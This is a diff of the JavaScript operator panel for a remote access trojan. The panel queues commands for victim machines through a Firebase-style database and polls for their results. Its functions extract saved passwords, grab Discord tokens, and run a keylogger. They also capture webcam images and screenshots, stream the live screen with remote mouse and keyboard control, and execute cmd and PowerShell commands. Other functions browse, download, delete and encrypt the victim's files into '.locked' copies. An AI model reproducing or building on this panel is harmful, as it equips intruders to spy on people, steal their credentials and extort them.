- const el=document.getElementById('sysResult');const err=document.getElementById('sysErr');
- err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Loading...</div>';
- const res=await sendAndWait('system_info','',el,'sysErr');
- if(res&&res.result){
-  try{
-   const d=JSON.parse(res.result);const cards=document.getElementById('sysInfoCards');cards.style.display='grid';
-   let html='';
-   html+='<div class="sysinfo-card"><div class="val">'+esc(d.host||'?')+'</div><div class="lbl">Hostname</div></div>';
-   html+='<div class="sysinfo-card"><div class="val">'+d.cores+'</div><div class="lbl">CPU Cores</div></div>';
-   html+='<div class="sysinfo-card"><div class="val">'+(d.ram/1024).toFixed(1)+' GB</div><div class="lbl">Total RAM</div></div>';
-   html+='<div class="sysinfo-card"><div class="val">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="lbl">Free RAM</div></div>';
-   if(d.disks&&d.disks.length){d.disks.forEach(dk=>{const pct=((dk.t-dk.f)/dk.t*100).toFixed(0);html+='<div class="sysinfo-card"><div class="val">'+dk.d+': '+(dk.f/1024).toFixed(1)+' GB</div><div class="lbl">Free of '+(dk.t/1024).toFixed(1)+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>';});}
-   cards.innerHTML=html;el.innerHTML='<div style="color:#4ade80">✓ System info loaded</div>';
-  }catch(e){el.innerHTML='<div class="loading">Parse error</div>';}
- }
-}
-
-async function loadPasswords(){const el=document.getElementById('pwResult');const err=document.getElementById('pwErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Extracting passwords...</div>';const res=await sendAndWait('passwords','',el,'pwErr');if(res&&res.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';const d=document.createElement('div');d.className='toast';d.textContent='✓ Passwords extracted';document.body.appendChild(d);setTimeout(()=>d.remove(),2000);}}
-async function loadNetworkInfo(){const el=document.getElementById('netResult');const err=document.getElementById('netErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Gathering network info...</div>';const res=await sendAndWait('network_info','',el,'netErr');if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';}
-async function loadServices(){const el=document.getElementById('svcResult');const err=document.getElementById('svcErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Listing services...</div>';const res=await sendAndWait('services','',el,'svcErr');if(res&&res.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';const lines=res.result.split('\n').filter(l=>l.includes('SERVICE_NAME')||l.includes('DISPLAY_NAME')||l.includes('STATE'));document.getElementById('svcCount').textContent='~'+lines.length+' services';}}
-async function loadInstalledApps(){const el=document.getElementById('appResult');const err=document.getElementById('appErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Listing installed apps...</div>';const res=await sendAndWait('installed_apps','',el,'appErr');if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';}
-
-async function loadProcesses(){const el=document.getElementById('procResult');const errEl=document.getElementById('procErr');errEl.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Loading processes...</div>';const res=await sendAndWait('process_list','',el,'procErr');if(res&&res.result){renderProcesses(res.result);}else if(res){el.innerHTML='<div class="loading">Empty result</div>';}}
-function renderProcesses(json){const el=document.getElementById('procResult');let entries;try{entries=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}if(!Array.isArray(entries)){el.innerHTML='<div class="loading">Bad response</div>';return}document.getElementById('procCount').textContent=entries.length+' processes';if(!entries.length){el.innerHTML='<div class="loading">No processes</div>';return}let html='<table class="proc-table"><thead><tr><th>Process</th><th>PID</th><th></th></tr></thead><tbody>';entries.forEach(e=>{const nm=e.n||'?';const pid=e.p||0;html+='<tr><td class="pname">'+esc(nm)+'</td><td class="pid">'+pid+'</td><td class="pkill"><button class="btn btn-danger btn-sm" onclick="killProc('+pid+',\''+uenc(nm)+'\')">Kill</button></td></tr>';});html+='</tbody></table>';el.innerHTML=html;}
-async function killProc(pid,name){try{name=decodeURIComponent(name)}catch{}if(!confirm('Kill '+name+' (PID: '+pid+')?'))return;const el=document.getElementById('procResult');const res=await sendAndWait('kill_process',String(pid),el,'procErr');if(res&&res.result==='ok'){loadProcesses();}else if(res){alert('Failed: '+res.result);}}
-
-function esc(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}
-function uenc(t){return encodeURIComponent(t).replace(/'/g,'%27')}
-
-async function fileDownload(i){
- if(!g_fileEntries||!g_fileEntries[i])return;
- const nm=g_fileEntries[i].n||'';
- const path=filePath+nm;
- const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
- errEl.style.display='none';el.innerHTML='<div class="loading">Downloading '+esc(nm)+'...</div>';
- const res=await sendAndWait('file_download',path,el,'filesErr');
- if(res&&res.result&&!res.result.startsWith('err:')){
-  const bin=atob(res.result);const arr=new Uint8Array(bin.length);for(let j=0;j<bin.length;j++)arr[j]=bin.charCodeAt(j);
-  const blob=new Blob([arr]);const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=nm;a.click();URL.revokeObjectURL(a.href);
-  refreshLocalFiles();
- }else if(res){el.innerHTML='<div class="loading">'+esc(res.result||'Download failed')+'</div>';}
-}
-async function sendVolume(){const v=document.getElementById('volSlider').value;const el=document.getElementById('sysResult');await sendAndWait('volume',v,el,'sysErr');el.innerHTML='<div style="color:#4ade80">Volume set to '+v+'</div>';}
-async function setWallpaper(){const p=document.getElementById('wallInput').value.trim();if(!p)return;const el=document.getElementById('sysResult');const res=await sendAndWait('wallpaper',p,el,'sysErr');if(res)el.innerHTML='<div style="color:#4ade80">Wallpaper set</div>';}
-async function setClipboardText(){const t=document.getElementById('clipWriteInput').value;if(!t)return;const el=document.getElementById('sysResult');const res=await sendAndWait('clipboard_write',t,el,'sysErr');if(res)el.innerHTML='<div style="color:#4ade80">Clipboard written</div>';}
-async function loadHostInfo(){
- const el=document.getElementById('hostResult');const err=document.getElementById('hostErr');err.style.display='none';
- el.innerHTML='<div class="loading"><span class="spinner"></span>Loading host info...</div>';
- const res=await sendAndWait('host_info','',el,'hostErr');
- if(res&&res.result){
-  try{
-   const d=JSON.parse(res.result);const cards=document.getElementById('hostInfoCards');cards.style.display='grid';
-   let html='';
-   html+='<div class="sysinfo-card"><div class="val">'+esc(d.host||'?')+'</div><div class="lbl">Hostname</div></div>';
-   html+='<div class="sysinfo-card"><div class="val">'+esc(d.user||'?')+'</div><div class="lbl">Username</div></div>';
-   html+='<div class="sysinfo-card"><div class="val">'+esc(d.os||'?')+'</div><div class="lbl">OS</div></div>';
-   html+='<div class="sysinfo-card"><div class="val">'+esc(d.arch||'?')+'</div><div class="lbl">Architecture</div></div>';
-   html+='<div class="sysinfo-card"><div class="val">'+d.cores+'</div><div class="lbl">CPU Cores</div></div>';
-   html+='<div class="sysinfo-card"><div class="val">'+(d.ram/1024).toFixed(1)+' GB</div><div class="lbl">Total RAM</div></div>';
-   html+='<div class="sysinfo-card"><div class="val">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="lbl">Free RAM</div></div>';
-   html+='<div class="sysinfo-card"><div class="val">'+Math.floor(d.uptime/3600)+'h '+Math.floor((d.uptime%3600)/60)+'m</div><div class="lbl">Uptime</div></div>';
-   if(d.gpus)html+='<div class="sysinfo-card"><div class="val">'+esc(d.gpus)+'</div><div class="lbl">GPU</div></div>';
-   if(d.disks&&d.disks.length){d.disks.forEach(dk=>{const pct=dk.t>0?((dk.t-dk.f)/dk.t*100).toFixed(0):0;html+='<div class="sysinfo-card"><div class="val">'+dk.d+': '+(dk.f).toFixed(1)+' GB free</div><div class="lbl">'+(dk.v||'Drive')+' of '+dk.t+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>';});}
-   cards.innerHTML=html;el.innerHTML='<div style="color:#4ade80">✓ Host info loaded</div>';
-  }catch(e){el.innerHTML='<div class="loading">Parse error: '+e.message+'</div>';}
- }
-}
-async function loadEnvVars(){const el=document.getElementById('hostResult');const err=document.getElementById('hostErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Loading env vars...</div>';const res=await sendAndWait('env_vars','',el,'hostErr');if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';}
-async function takeScreenshotAll(){const el=document.getElementById('hostResult');const err=document.getElementById('hostErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Capturing all monitors...</div>';const res=await sendAndWait('screenshot_all','',el,'hostErr');if(res&&res.result){const parts=res.result.split('===MON:');parts.forEach((p,i)=>{if(i===0){el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+p+'">';}else{const m=p.split('===\n');el.innerHTML+='<div style="color:rgba(255,255,255,.3);font-size:.7rem;margin-top:.5rem">Monitor '+m[0]+'</div><img class="screenshot" src="data:image/jpeg;base64,'+m[1]+'">';}});}}
-async function startKeylogger(){const el=document.getElementById('klResult');const err=document.getElementById('klErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Starting...</div>';const res=await sendAndWait('keylog_start','',el,'klErr');if(res){document.getElementById('klStartBtn').style.display='none';document.getElementById('klStopBtn').style.display='';document.getElementById('klStatus').textContent='● Running';el.innerHTML='<div style="color:#4ade80">Keylogger started</div>';}}
-async function stopKeylogger(){const el=document.getElementById('klResult');const err=document.getElementById('klErr');err.style.display='none';const res=await sendAndWait('keylog_stop','',el,'klErr');if(res){document.getElementById('klStartBtn').style.display='';document.getElementById('klStopBtn').style.display='none';document.getElementById('klStatus').textContent='Stopped';el.innerHTML='<div style="color:#4ade80">Keylogger stopped</div>';}}
-async function dumpKeylog(){const el=document.getElementById('klResult');const err=document.getElementById('klErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Dumping...</div>';const res=await sendAndWait('keylog_dump','',el,'klErr');if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.8rem;line-height:1.6">'+esc(res.result)+'</pre>';}
-async function loadActivityLog(){const el=document.getElementById('logResult');const err=document.getElementById('logErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Loading...</div>';try{const r=await fetch(FB+'/logs.json?limit=200');const d=await r.json();if(!d||!d.length){el.innerHTML='<div class="loading">No activity yet</div>';return;}let html='';d.reverse().forEach(e=>{const time=new Date(e.t).toLocaleTimeString();html+='<div style="font-size:.75rem;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span style="color:rgba(255,255,255,.3)">'+time+'</span> <span style="color:#818cf8">'+esc(e.type)+'</span> <span style="color:#f0f4fc">'+esc(e.computer)+'</span> <span style="color:rgba(255,255,255,.4)">'+esc(e.detail||'')+'</span></div>';});el.innerHTML=html;}catch(e){el.innerHTML='<div class="loading">Error loading log</div>';}}
-
-let cmdHistory=[];let cmdHistIdx=-1;
-document.addEventListener('DOMContentLoaded',()=>{
- const cmdInput=document.getElementById('cmdInput');
- if(cmdInput){cmdInput.addEventListener('keydown',e=>{
-  if(e.key==='ArrowUp'){e.preventDefault();if(cmdHistIdx<cmdHistory.length-1){cmdHistIdx++;cmdInput.value=cmdHistory[cmdHistIdx];}}
-  else if(e.key==='ArrowDown'){e.preventDefault();if(cmdHistIdx>0){cmdHistIdx--;cmdInput.value=cmdHistory[cmdHistIdx];}else{cmdHistIdx=-1;cmdInput.value='';}}
- });}
- const monSel=document.getElementById('liveMonSelect');
- if(monSel){for(let i=0;i<8;i++){const o=document.createElement('option');o.value=i;o.textContent='Monitor '+(i+1);monSel.appendChild(o);}}
+  if(e.ctrlKey&&e.key==='r'){e.preventDefault();if(currentTab==='proc')loadProc();else if(currentTab==='log')loadLog();}
+  // Ctrl+Enter in cmd input
+  if(e.ctrlKey&&e.key==='Enter'){const inp=document.getElementById('cmdIn');if(inp)runCmd();}
 });
-const origRunCmd=runCmd;
-async function runCmdWithHistory(){
- const input=document.getElementById('cmdInput');
- const cmd=input.value.trim();if(!cmd)return;
- if(cmdHistory.length===0||cmdHistory[cmdHistory.length-1]!==cmd)cmdHistory.push(cmd);
- cmdHistIdx=-1;
- return origRunCmd.call?origRunCmd():void(0);
+
+// === sendAndWait ===
+let g_fe=null;
+async function saw(type,payload,el,errId){
+  const ee=document.getElementById(errId);if(ee)ee.style.display='none';
+  el.innerHTML='<div class="loading"><span class="sp"></span>Sending...</div>';
+  const id='c'+Date.now().toString(36)+Math.random().toString(36).slice(2,10);
+  const base=FB+'/commands/'+encodeURIComponent(computer);
+  try{
+    const r=await fetch(base+'/'+id+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
+    if(!r.ok){el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';if(ee){ee.textContent='Server '+r.status;ee.style.display='block'}return null}
+    el.innerHTML='<div class="loading"><span class="sp"></span>Waiting...</div>';
+    for(let i=0;i<50;i++){
+      if(i)await new Promise(r=>setTimeout(r,100));
+      try{const r2=await fetch(base+'.json?_='+Date.now(),{cache:'no-store'});if(!r2.ok)continue;const all=await r2.json();if(all&&all[id]&&all[id].status==='done'){const row=all[id];fetch(base+'/'+id+'.json',{method:'DELETE'}).catch(()=>{});return row}}catch{}
+    }
+    el.innerHTML='<div class="loading">Timeout</div>';if(ee){ee.textContent='No response';ee.style.display='block'}return null
+  }catch(e){el.innerHTML='<div class="loading">Error</div>';if(ee){ee.textContent=e.message||'err';ee.style.display='block'}return null}
 }
+
+function esc(s){if(!s)return'';return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
+function uenc(s){return encodeURIComponent(s).replace(/'/g,'%27')}
+
+// === CMD ===
+async function runCmd(){
+  const inp=document.getElementById('cmdIn');const cmd=inp.value.trim();if(!cmd)return
+  const out=document.getElementById('cmdOut');out.textContent+='❯ '+cmd+'\n';inp.value='';
+  const r=await saw('cmd',cmd,out,'cmdErr');if(r)out.textContent+=(r.result||'(no output)')+'\n';out.scrollTop=out.scrollHeight
+}
+function copyCmdOut(){navigator.clipboard.writeText(document.getElementById('cmdOut').textContent).then(()=>toast('Output copied'))}
+function clrCmd(){document.getElementById('cmdOut').textContent='Ready.'}
+
+// === Screenshot ===
+async function takeSS(){const el=document.getElementById('ssOut');const mon=document.getElementById('monSel').value;const r=await saw('screenshot',mon,el,'ssErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">';else if(r)el.innerHTML='<div class="loading">Empty</div>';}
+async function takeCam(){const el=document.getElementById('camOut');const ee=document.getElementById('camErr');ee.style.display='none';const r=await saw('webcam','',el,'camErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">';else if(r)el.innerHTML='<div class="loading">Empty</div>';}
+async function grabTok(){const el=document.getElementById('tokOut');const ee=document.getElementById('tokErr');ee.style.display='none';const r=await saw('discord_tokens','',el,'tokErr');if(r&&r.result)el.innerHTML='<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:.75rem;line-height:1.5">'+esc(r.result)+'</pre>';else if(r)el.innerHTML='<div class="loading">No tokens</div>';}
+
+// === Live Screen ===
+let liveOn=false,fc=0,fpsT=0,pollLast=0;
+async function startLive(){
+  document.getElementById('liveStart').style.display='none';document.getElementById('liveStop').style.display='';liveOn=true;fc=0;fpsT=Date.now();pollLive()
+}
+async function pollLive(){
+  if(!liveOn)return;
+  try{
+    const r=await fetch(FB+'/live/'+encodeURIComponent(computer)+'.json?_='+Date.now(),{cache:'no-store'});
+    if(r.ok){const row=await r.json();if(row&&row.r){
+      const t=new Date(row.t).getTime();const el=document.getElementById('liveOut');
+      if(Date.now()-t<30000){
+        const src='data:image/jpeg;base64,'+row.r;
+        if(el.querySelector('img')){el.querySelector('img').src=src}
+        else{el.innerHTML='<div class="screen-container" style="position:relative;display:inline-block;max-width:100%"><img class="img-out" id="liveImg" src="'+src+'"><canvas id="liveCanvas" style="position:absolute;top:0;left:0;cursor:crosshair"></canvas></div>';setupCanvas()}
+        pollLast=t;fc++
+      }
+    }}
+  }catch{}
+  const fps=Date.now()-fpsT>=1000?(document.getElementById('fps').textContent=Math.round(fc/((Date.now()-fpsT)/1000))+' fps',fc=0,fpsT=Date.now()):0
+  setTimeout(pollLive,100)
+}
+function stopLive(){liveOn=false;document.getElementById('liveStart').style.display='';document.getElementById('liveStop').style.display='none';document.getElementById('fps').textContent='0 fps';document.getElementById('liveOut').innerHTML='<div class="loading">Stopped</div>';if(mouseOn)tgMouse();if(keyOn)tgKey()}
+async function sendLiveCfg(){const q=document.getElementById('liveQ').value;try{await fetch(FB+'/commands/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'live_config',payload:JSON.stringify({quality:parseInt(q)}),status:'pending'})})}catch{}}
+function setupCanvas(){const img=document.getElementById('liveImg');const c=document.getElementById('liveCanvas');if(!img||!c)return;const rz=()=>{c.width=img.clientWidth;c.height=img.clientHeight;c.style.width=img.clientWidth+'px';c.style.height=img.clientHeight+'px'};img.onload=rz;setTimeout(rz,100)}
+function getSC(e){const c=document.getElementById('liveCanvas');const img=document.getElementById('liveImg');if(!c||!img)return null;const r=c.getBoundingClientRect();const s=parseFloat(document.getElementById('liveS').value)||1;return{x:Math.round((e.clientX-r.left)*img.naturalWidth/c.width/s),y:Math.round((e.clientY-r.top)*img.naturalHeight/c.height/s)}}
+async function sf(type,payload){try{await fetch(FB+'/input/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,payload:payload||''})})}catch{}}
+let mouseOn=false,keyOn=false,mt=0;
+function tgMouse(){mouseOn=!mouseOn;const b=document.getElementById('mouseBtn');b.textContent=mouseOn?'ON':'OFF';b.classList.toggle('active-on',mouseOn);setupME()}
+function tgKey(){keyOn=!keyOn;const b=document.getElementById('keyBtn');b.textContent=keyOn?'ON':'OFF';b.classList.toggle('active-on',keyOn)}
+function setupME(){const c=document.getElementById('liveCanvas');if(!c)return;c.style.cursor=mouseOn?'crosshair':'default';c.onmousedown=mouseOn?function(e){if(!mouseOn)return;const p=getSC(e);if(p)sf('mouse',JSON.stringify({x:p.x,y:p.y,action:'down'}))}:null;c.onmouseup=mouseOn?function(e){if(!mouseOn)return;const p=getSC(e);if(p)sf('mouse',JSON.stringify({x:p.x,y:p.y,action:'up'}))}:null;c.onmousemove=mouseOn?function(e){if(!mouseOn)return;const n=Date.now();if(n-mt<50)return;mt=n;const p=getSC(e);if(p)sf('mouse',JSON.stringify({x:p.x,y:p.y,action:'move'}))}:null}
+document.addEventListener('keydown',function(e){if(!keyOn||e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;e.preventDefault();sf('keyboard',JSON.stringify({key:e.keyCode,action:'down'}))});
+document.addEventListener('keyup',function(e){if(!keyOn||e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;e.preventDefault();sf('keyboard',JSON.stringify({key:e.keyCode,action:'up'}))});
+
+// === Processes ===
+let gProc=[],gProcFiltered=[];
+async function loadProc(){const el=document.getElementById('procOut');const ee=document.getElementById('procErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';const r=await saw('process_list','',el,'procErr');if(r&&r.result){renderProc(r.result)}}
+function renderProc(json){const el=document.getElementById('procOut');let e;try{e=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}if(!Array.isArray(e)){el.innerHTML='<div class="loading">Bad response</div>';return}gProc=e;document.getElementById('procCnt').textContent=e.length+' procs';filterProc()}
+function filterProc(){const q=document.getElementById('procSearch').value.toLowerCase();const el=document.getElementById('procOut');const f=gProc.filter(e=>(e.n||'').toLowerCase().includes(q));if(!f.length){el.innerHTML='<div class="loading">No matches</div>';return}let html='<table class="proc-t"><thead><tr><th>Process</th><th>PID</th><th></th></tr></thead><tbody>';f.forEach(e=>{const nm=e.n||'?';const pid=e.p||0;html+='<tr><td class="pnm">'+esc(nm)+'</td><td class="pid">'+pid+'</td><td class="pkl"><button class="btn btn-d btn-sm" onclick="killProc('+pid+',\''+uenc(nm)+'\')">✕</button></td></tr>'});html+='</tbody></table>';el.innerHTML=html}
+async function killProc(pid,name){try{name=decodeURIComponent(name)}catch{}if(!confirm('Kill '+name+' (PID '+pid+')?'))return;const el=document.getElementById('procOut');const r=await saw('kill_process',String(pid),el,'procErr');if(r&&r.result==='ok')loadProc();else if(r)toast('Failed: '+r.result)}
+
+// === System ===
+async function sysCmd(t){const el=document.getElementById('sysOut');if(t==='shutdown'||t==='restart')if(!confirm(t+'?'))return;const r=await saw(t,'',el,'sysErr');if(r)el.innerHTML='<div style="color:var(--grn)">✓ '+t+'</div>'}
+function showMsg(){const t=prompt('Msg:');if(!t)return;const ti=prompt('Title:','Remote');const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>Sending...</div>';saw('msgbox',JSON.stringify({text:t,title:ti||'Remote'}),el,'sysErr').then(r=>{if(r)el.innerHTML='<div style="color:var(--grn)">✓ Sent</div>'})}
+async function getClip(){const el=document.getElementById('sysOut');const r=await saw('clipboard','',el,'sysErr');if(r)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
+async function getIdle(){const el=document.getElementById('sysOut');const r=await saw('idle','',el,'sysErr');if(r)el.innerHTML='Idle: '+esc(r.result)+'s'}
+async function getUp(){const el=document.getElementById('sysOut');const r=await saw('uptime','',el,'sysErr');if(r)el.innerHTML='Uptime: '+esc(r.result)+'s ('+Math.floor(parseInt(r.result||'0')/3600)+'h)'}
+async function runPS(){const c=document.getElementById('psIn').value.trim();if(!c)return;const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>PS...</div>';const r=await saw('powershell',c,el,'sysErr');if(r)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
+async function loadSys(){const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';const r=await saw('system_info','',el,'sysErr');if(r&&r.result){try{const d=JSON.parse(r.result);const g=document.getElementById('sysGrid');g.style.display='grid';let h='';h+='<div class="card"><div class="v">'+esc(d.host||'?')+'</div><div class="l">Hostname</div></div>';h+='<div class="card"><div class="v">'+d.cores+'</div><div class="l">CPU Cores</div></div>';h+='<div class="card"><div class="v">'+(d.ram/1024).toFixed(1)+' GB</div><div class="l">RAM Total</div></div>';h+='<div class="card"><div class="v">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="l">RAM Free</div></div>';if(d.disks&&d.disks.length)d.disks.forEach(dk=>{const pct=((dk.t-dk.f)/dk.t*100).toFixed(0);h+='<div class="card"><div class="v">'+dk.d+': '+(dk.f/1024).toFixed(1)+' GB</div><div class="l">'+(dk.t/1024).toFixed(1)+' GB total</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>'});g.innerHTML=h;el.innerHTML='<div style="color:var(--grn)">✓ System info</div>'}catch(e){el.innerHTML='<div class="loading">Parse error</div>'}}}
+async function sendVol(){const v=document.getElementById('volSl').value;const el=document.getElementById('sysOut');await saw('volume',v,el,'sysErr');el.innerHTML='<div style="color:var(--grn)">Vol: '+v+'</div>'}
+async function setWall(){const p=document.getElementById('wallIn').value.trim();if(!p)return;const el=document.getElementById('sysOut');const r=await saw('wallpaper',p,el,'sysErr');if(r)el.innerHTML='<div style="color:var(--grn)">Wallpaper set</div>'}
+async function setClip(){const t=document.getElementById('clipIn').value;if(!t)return;const el=document.getElementById('sysOut');const r=await saw('clipboard_write',t,el,'sysErr');if(r)el.innerHTML='<div style="color:var(--grn)">Clipboard written</div>'}
+
+// === Passwords, Network, Services, Apps ===
+async function loadPW(){const el=document.getElementById('pwOut');const ee=document.getElementById('pwErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Extracting...</div>';const r=await saw('passwords','',el,'pwErr');if(r&&r.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>';toast('Passwords extracted')}}
+async function loadNet(){const el=document.getElementById('netOut');const ee=document.getElementById('netErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading net...</div>';const r=await saw('network_info','',el,'netErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
+async function loadSvc(){const el=document.getElementById('svcOut');const ee=document.getElementById('svcErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading services...</div>';const r=await saw('services','',el,'svcErr');if(r&&r.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>';const l=r.result.split('\n').filter(l=>l.includes('SERVICE_NAME')||l.includes('DISPLAY_NAME'));document.getElementById('svcCnt').textContent='~'+l.length+' svcs'}}
+async function loadApps(){const el=document.getElementById('appOut');const ee=document.getElementById('appErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Listing apps...</div>';const r=await saw('installed_apps','',el,'appErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
+
+// === Files ===
+let g_fp='',g_fl=false;
+async function browseDir(path){
+  if(g_fl)return;g_fl=true;try{path=decodeURIComponent(path)}catch{}
+  const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';
+  el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';
+  const r=await saw('file_list',path,el,'filesErr');
+  if(r&&r.result){g_fp=path||'';renderFiles(r.result)}else if(r===null){el.innerHTML='<div class="loading">No response</div>'}
+  g_fl=false;
+}
+function renderFiles(json){
+  const el=document.getElementById('filesB');let e;try{e=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}
+  if(!Array.isArray(e)){el.innerHTML='<div class="loading">Bad response</div>';return}
+  g_fe=e;let html='<div class="path"><span>'+esc(g_fp||'This PC')+'</span>';
+  if(g_fp)html+='<button class="btn btn-g btn-sm" onclick="browseDir(\'\')">Root</button>';
+  if(g_fp){const p=g_fp.replace(/\\+$/,'');const idx=p.lastIndexOf('\\');if(idx>0)html+='<button class="btn btn-g btn-sm" onclick="browseDir(\''+uenc(p.substr(0,idx+1))+'\')">Up</button>'}
+  html+='</div>';
+  for(let i=0;i<e.length;i++){
+  const en=e[i],nm=en.n||'?',isd=en.d===true||en.d==='true',sz=en.s||0,dt=en.m||'';
+  const szs=sz<1024?sz+'B':sz<1048576?(sz/1024).toFixed(1)+'KB':(sz/1048576).toFixed(1)+'MB';
+  const fp=g_fp+nm;
+  html+='<div class="entry'+(isd?' dir':'')+'"><div class="ico '+(isd?'f':'fl')+'" onclick="'+(isd?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+(isd?'📁':'📄')+'</div>';
+  html+='<div class="nm" onclick="'+(isd?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+esc(nm)+'</div>';
+  html+=isd?'<div class="sz"></div>':'<div class="sz">'+szs+'</div>';
+  html+='<div class="dt">'+esc(dt)+'</div>';
+  if(!isd){html+='<div class="acts"><button class="btn-xs" onclick="fDown('+i+')" title="DL">⬇</button><button class="btn-xs" onclick="fRen('+i+')" title="Rename">✏</button><button class="btn-xs" onclick="fDel('+i+')" title="Delete">🗑</button><button class="btn-xs" onclick="fEnc('+i+')" title="Encrypt">🔒</button>'+(nm.endsWith('.locked')?'<button class="btn-xs" onclick="fDec('+i+')" title="Decrypt">🔓</button>':'')+'</div>'}
+  else{html+='<div class="acts"><button class="btn-xs" onclick="fRen('+i+')" title="Rename">✏</button><button class="btn-xs" onclick="fDel('+i+')" title="Delete">🗑</button></div>'}
+  html+='</div>'}
+  el.innerHTML=html;
+}
+function rf(){if(!g_fe||!Array.isArray(g_fe))return;renderFiles(JSON.stringify(g_fe))}
+async function fDel(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';if(!confirm('Delete "'+nm+'"?'))return;const p=g_fp+nm;const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">Deleting...</div>';const r=await saw('file_delete',p,el,'filesErr');if(r){g_fe.splice(i,1);rf()}}
+async function fRen(i){if(!g_fe||!g_fe[i])return;const old=g_fe[i].n||'';const n=prompt('New name:',old);if(!n||n===old)return;const p=g_fp+old;const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">Renaming...</div>';const r=await saw('file_rename',JSON.stringify({path:p,name:n}),el,'filesErr');if(r){g_fe[i].n=n;rf()}}
+async function fEnc(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';if(!confirm('Encrypt "'+nm+'"?'))return;const p=g_fp+nm;const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">Encrypting...</div>';const r=await saw('file_encrypt',p,el,'filesErr');if(r){g_fe[i].n=nm+'.locked';rf()}}
+async function fDec(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';if(!confirm('Decrypt "'+nm+'"?'))return;const p=g_fp+nm;const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">Decrypting...</div>';const r=await saw('file_decrypt',p,el,'filesErr');if(r){if(nm.endsWith('.locked'))g_fe[i].n=nm.slice(0,-7);else g_fe[i].n+='.unlocked';rf()}}
